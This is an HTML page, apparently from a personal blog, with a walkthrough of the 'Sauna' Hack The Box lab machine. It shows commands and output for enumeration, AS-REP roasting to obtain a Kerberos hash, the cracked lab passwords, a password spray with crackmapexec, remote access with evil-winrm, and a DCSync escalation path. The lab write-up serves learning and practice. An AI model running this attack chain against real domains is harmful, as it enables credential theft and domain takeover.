@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#151515">
+<meta name="msapplication-navbutton-color" content="#151515">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>CentHack | Welcome to my blog!!</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="CentHack" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Welcome to my blog!!" />
+<meta property="og:description" content="Welcome to my blog!!" />
+<link rel="canonical" href="http://localhost:4000/pages/writeups/sauna.html" />
+<meta property="og:url" content="http://localhost:4000/pages/writeups/sauna.html" />
+<meta property="og:site_name" content="CentHack" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="CentHack" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Welcome to my blog!!","headline":"CentHack","url":"http://localhost:4000/pages/writeups/sauna.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>CentHack</h1>
+        </a>
+        <h2>Welcome to my blog!!</h2>
+
+        <section id="downloads">
+          
+          <a href="" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <h1 id="sauna">Sauna</h1>
+
+<h1 id="enumeration">Enumeration</h1>
+
+<p>IP → 10.10.10.175</p>
+
+<p>Port scan reported the following opened ports.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE          REASON
+53/tcp    open  domain           syn-ack
+80/tcp    open  http             syn-ack
+88/tcp    open  kerberos-sec     syn-ack
+135/tcp   open  msrpc            syn-ack
+139/tcp   open  netbios-ssn      syn-ack
+389/tcp   open  ldap             syn-ack
+445/tcp   open  microsoft-ds     syn-ack
+464/tcp   open  kpasswd5         syn-ack
+593/tcp   open  http-rpc-epmap   syn-ack
+636/tcp   open  ldapssl          syn-ack
+3268/tcp  open  globalcatLDAP    syn-ack
+3269/tcp  open  globalcatLDAPssl syn-ack
+5985/tcp  open  wsman            syn-ack
+9389/tcp  open  adws             syn-ack
+49668/tcp open  unknown          syn-ack
+49673/tcp open  unknown          syn-ack
+49674/tcp open  unknown          syn-ack
+49677/tcp open  unknown          syn-ack
+49689/tcp open  unknown          syn-ack
+49697/tcp open  unknown          syn-ack
+</code></pre></div></div>
+
+<h3 id="port-53">Port 53</h3>
+
+<ul>
+  <li>DNS</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span>dig ANY EGOTISTICAL-BANK.LOCAL @10.10.10.175
+
+<span class="p">;</span> &lt;&lt;<span class="o">&gt;&gt;</span> DiG 9.18.16-1-Debian &lt;&lt;<span class="o">&gt;&gt;</span> ANY EGOTISTICAL-BANK.LOCAL @10.10.10.175
+<span class="p">;;</span> global options: +cmd
+<span class="p">;;</span> Got answer:
+<span class="p">;;</span> WARNING: .local is reserved <span class="k">for </span>Multicast DNS
+<span class="p">;;</span> You are currently testing what happens when an mDNS query is leaked to DNS
+<span class="p">;;</span> -&gt;&gt;HEADER<span class="o">&lt;&lt;-</span> <span class="no">opcode</span><span class="sh">: QUERY, status: NOERROR, id: 25812
+;; flags: qr aa rd ra; QUERY: 1, ANSWER: 4, AUTHORITY: 0, ADDITIONAL: 4
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4000
+;; QUESTION SECTION:
+;EGOTISTICAL-BANK.LOCAL.                IN      ANY
+
+;; ANSWER SECTION:
+EGOTISTICAL-BANK.LOCAL. 600     IN      A       10.10.10.175
+EGOTISTICAL-BANK.LOCAL. 3600    IN      NS      sauna.EGOTISTICAL-BANK.LOCAL.
+EGOTISTICAL-BANK.LOCAL. 3600    IN      SOA     sauna.EGOTISTICAL-BANK.LOCAL. hostmaster.EGOTISTICAL-BANK.LOCAL. 48 900 600 86400 3600
+EGOTISTICAL-BANK.LOCAL. 600     IN      AAAA    dead:beef::d82a:5af8:762a:f639
+
+;; ADDITIONAL SECTION:
+sauna.EGOTISTICAL-BANK.LOCAL. 3600 IN   A       10.10.10.175
+sauna.EGOTISTICAL-BANK.LOCAL. 3600 IN   AAAA    dead:beef::656c:5335:5c58:6664
+sauna.EGOTISTICAL-BANK.LOCAL. 3600 IN   AAAA    dead:beef::bf
+
+;; Query time: 47 msec
+;; SERVER: 10.10.10.175#53(10.10.10.175) (TCP)
+;; WHEN: Mon Nov 13 20:17:30 CET 2023
+;; MSG SIZE  rcvd: 234
+</span></code></pre></div></div>
+
+<h3 id="port-445139">Port 445/139</h3>
+
+<ul>
+  <li>SMB</li>
+  <li>Need credentials</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span>crackmapexec smb 10.10.10.175 <span class="nt">-u</span> <span class="s1">'%'</span> <span class="nt">-p</span> <span class="s1">'%'</span> <span class="nt">--shares</span>
+SMB         10.10.10.175    445    SAUNA            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:SAUNA<span class="o">)</span> <span class="o">(</span>domain:EGOTISTICAL-BANK.LOCAL<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.10.175    445    SAUNA            <span class="o">[</span>-] EGOTISTICAL-BANK.LOCAL<span class="se">\%</span>:% STATUS_LOGON_FAILURE 
+                                                                                                                                                                                                                                            
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span>smbclient <span class="nt">-L</span> <span class="se">\\\\</span>10.10.10.175<span class="se">\\</span> <span class="nt">-N</span>
+Anonymous login successful
+
+        Sharename       Type      Comment
+        <span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
+Reconnecting with SMB1 <span class="k">for </span>workgroup listing.
+do_connect: Connection to 10.10.10.175 failed <span class="o">(</span>Error NT_STATUS_RESOURCE_NAME_NOT_FOUND<span class="o">)</span>
+Unable to connect with SMB1 <span class="nt">--</span> no workgroup available
+</code></pre></div></div>
+
+<h3 id="port-139">Port 139</h3>
+
+<ul>
+  <li>RPC</li>
+  <li>Need credentials</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span>rpcclient <span class="nt">-U</span> <span class="s1">'%'</span> 10.10.10.175
+rpcclient <span class="nv">$&gt;</span> enumdomusers
+result was NT_STATUS_ACCESS_DENIED
+</code></pre></div></div>
+
+<h3 id="port-389">Port 389</h3>
+
+<ul>
+  <li>LDAP</li>
+  <li>We can connect but the full tree isn’t represented</li>
+</ul>
+
+<p>From the port 80 we can obtain  series of names and creating a wordlist with common names in companies we obtain two valid usernames</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">fsmith</code> → obtain from the web page</li>
+  <li><code class="language-plaintext highlighter-rouge">hsmith</code> → obtain from LDAP</li>
+</ul>
+
+<p>We can perform an ASP-ROAST attack.</p>
+
+<h1 id="foothold">Foothold</h1>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/windows/sauna]
+└─<span class="nv">$ </span>impacket-GetNPUsers <span class="nt">-dc-ip</span> 10.10.10.175 EGOTISTICAL-BANK.LOCAL/ <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> users.txt
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+<span class="nv">$krb5asrep$23$fsmith</span>@EGOTISTICAL-BANK.LOCAL:e93df6639cb3c7676b14a3ba635cead0<span class="nv">$44a36d01b75e751ffa3b6ada9cf3c0fb7b0cc4aeb28af36874587ee86dbe54f4a819d96fb3b63376cb2e342fe40555374a4e9e60e20b204b6cc740d36b23327e2f76e4ec4f0ab46faa9c1d972f2ca56b7e92220228cac9da1b6f399c40f086839e91016344ba7f33d3d0ccea758d07e116a01e9940f3cf0e73c7f427b92c483a027fa73de416061d2480d5ac8285a62a597693dc9debdeab84af4e030581ea474d00f7c3d443db9b0ef1e6b2c832e9fdedef1426b42f7942db203634494c5d62e63cfa52d203921d48636cc01a4f1bd7adfae6e68c8ecc0de508ec96a791397549986002121785cabd701647eecfb264e9d9819b8d5cc60ac55bd51d2e884ab7</span>
+<span class="o">[</span>-] User hsmith doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] invalid principal syntax
+</span></code></pre></div></div>
+
+<p>Cracking this hash we obtain the password we obtain a set of credentials <code class="language-plaintext highlighter-rouge">fsmtih:Thestrokes23</code>.</p>
+
+<p>Whis credentials are valid for both users.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/windows/sauna]
+└─<span class="nv">$ </span>crackmapexec smb 10.10.10.175 <span class="nt">-u</span> users.txt <span class="nt">-p</span> password.txt <span class="nt">--continue-on-success</span>
+SMB         10.10.10.175    445    SAUNA            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:SAUNA<span class="o">)</span> <span class="o">(</span>domain:EGOTISTICAL-BANK.LOCAL<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.10.175    445    SAUNA            <span class="o">[</span>+] EGOTISTICAL-BANK.LOCAL<span class="se">\f</span>smith:Thestrokes23 
+SMB         10.10.10.175    445    SAUNA            <span class="o">[</span>+] EGOTISTICAL-BANK.LOCAL<span class="se">\h</span>smith:Thestrokes23
+</code></pre></div></div>
+
+<p>If we user ldapdomaindump to dump all the domain from LDAP, we can see that the user fsmith can connect remotely to the machine, and that there is another user.</p>
+
+<p><img src="Sauna%20(DCSync%20right%20over%20domain)%202f3852c85f1a447f890904e704db521d/Untitled.png" alt="Untitled" /></p>
+
+<p>We connect to the machine</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/windows/sauna]
+└─<span class="nv">$ </span>evil-winrm <span class="nt">-i</span> 10.10.10.175 <span class="nt">-u</span> <span class="s1">'fsmith'</span> <span class="nt">-p</span> <span class="s1">'Thestrokes23'</span>                        
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\F</span>Smith<span class="se">\D</span>ocuments&gt;
+</code></pre></div></div>
+
+<p>Basic enumeration didn’t show anything so launching winPEAS we can obtain the credentials for the user <strong>svc_loanmgr.</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/windows/sauna]
+└─<span class="nv">$ </span>crackmapexec smb 10.10.10.175 <span class="nt">-u</span> users.txt <span class="nt">-p</span> password.txt <span class="nt">--continue-on-success</span> 
+SMB         10.10.10.175    445    SAUNA            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:SAUNA<span class="o">)</span> <span class="o">(</span>domain:EGOTISTICAL-BANK.LOCAL<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.10.175    445    SAUNA            <span class="o">[</span>+] EGOTISTICAL-BANK.LOCAL<span class="se">\f</span>smith:Thestrokes23 
+SMB         10.10.10.175    445    SAUNA            <span class="o">[</span>-] EGOTISTICAL-BANK.LOCAL<span class="se">\f</span>smith:Moneymakestheworldgoround! STATUS_LOGON_FAILURE 
+SMB         10.10.10.175    445    SAUNA            <span class="o">[</span>+] EGOTISTICAL-BANK.LOCAL<span class="se">\h</span>smith:Thestrokes23 
+SMB         10.10.10.175    445    SAUNA            <span class="o">[</span>-] EGOTISTICAL-BANK.LOCAL<span class="se">\h</span>smith:Moneymakestheworldgoround! STATUS_LOGON_FAILURE 
+SMB         10.10.10.175    445    SAUNA            <span class="o">[</span>-] EGOTISTICAL-BANK.LOCAL<span class="se">\a</span>dministrator:Thestrokes23 STATUS_LOGON_FAILURE 
+SMB         10.10.10.175    445    SAUNA            <span class="o">[</span>-] EGOTISTICAL-BANK.LOCAL<span class="se">\a</span>dministrator:Moneymakestheworldgoround! STATUS_LOGON_FAILURE 
+SMB         10.10.10.175    445    SAUNA            <span class="o">[</span>-] EGOTISTICAL-BANK.LOCAL<span class="se">\s</span>vc_loanmgr:Thestrokes23 STATUS_LOGON_FAILURE 
+SMB         10.10.10.175    445    SAUNA            <span class="o">[</span>+] EGOTISTICAL-BANK.LOCAL<span class="se">\s</span>vc_loanmgr:Moneymakestheworldgoround! 
+SMB         10.10.10.175    445    SAUNA            <span class="o">[</span>-] EGOTISTICAL-BANK.LOCAL<span class="se">\:</span>Thestrokes23 STATUS_LOGON_FAILURE 
+SMB         10.10.10.175    445    SAUNA            <span class="o">[</span>-] EGOTISTICAL-BANK.LOCAL<span class="se">\:</span>Moneymakestheworldgoround! STATUS_LOGON_FAILURE
+</code></pre></div></div>
+
+<p>Now we will conect as him to the machine and see how to elevate out privileges.</p>
+
+<h1 id="privilege-escalation">Privilege escalation</h1>
+
+<p>This new user doesnt seem to have any new privilege over the DC in the LOCAL perspective, let’s see what about in the DOMAIN perspective.</p>
+
+<p>He has DCSync rights over the domain, so we can use secretsdump to get the administrator NTLM hash.</p>
+
+      </section>
+    </div>
+  </body>
+</html>
